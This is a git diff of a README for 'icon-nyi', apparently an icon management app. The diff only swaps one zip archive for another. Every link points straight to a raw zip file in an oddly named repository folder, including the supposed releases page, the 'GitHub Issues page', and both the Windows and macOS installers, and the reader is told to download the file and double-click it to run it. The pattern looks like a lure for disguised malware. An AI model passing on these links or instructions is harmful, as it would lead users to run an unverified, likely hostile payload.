@@ -1,6 +1,6 @@
 # 🎉 icon-nyi - Effortless Icon Management Made Simple
 
-[![Download icon-nyi](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip%https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip)](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip)
+[![Download icon-nyi](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip%https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip)](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip)
 
 ## 📋 Description
 
@@ -19,11 +19,11 @@ icon-nyi is a user-friendly application designed to help you manage and organize
 To get started with icon-nyi, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the official downloads page where you can find the latest version of icon-nyi.
-   [Download icon-nyi](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip)
+   [Download icon-nyi](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip)
 
 2. **Select the Latest Release**: On the releases page, you will see a list of available versions. The latest release is usually at the top. Look for the version number that indicates it is the most recent.
 
-3. **Download the Installer**: Click on the appropriate installer for your operating system (e.g., `https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip` for Windows or `https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip` for macOS). Your download should start automatically.
+3. **Download the Installer**: Click on the appropriate installer for your operating system (e.g., `https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip` for Windows or `https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip` for macOS). Your download should start automatically.
 
 4. **Run the Installer**: Once the download is complete, locate the downloaded file in your Downloads folder. Double-click it to launch the installer. 
 
@@ -61,7 +61,7 @@ If you encounter issues while installing or running icon-nyi:
 
 ## 💬 Support
 
-If you need additional help or have feedback about icon-nyi, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip). We value your input and aim to improve the application based on user experiences.
+If you need additional help or have feedback about icon-nyi, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip). We value your input and aim to improve the application based on user experiences.
 
 ## ⚖️ License
 
@@ -72,4 +72,4 @@ icon-nyi is released under the MIT License. You are free to use, modify, and sha
 Stay updated on new features and icon packs by following the project. Your experience with icon-nyi matters, and we are dedicated to providing the best icon management solution available.
 
 For more information, visit the releases page again:  
-[Download icon-nyi](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/icon-nyi.zip)
+[Download icon-nyi](https://raw.githubusercontent.com/jonhy161/icon-nyi/main/isochronal/nyi-icon-3.5.zip)
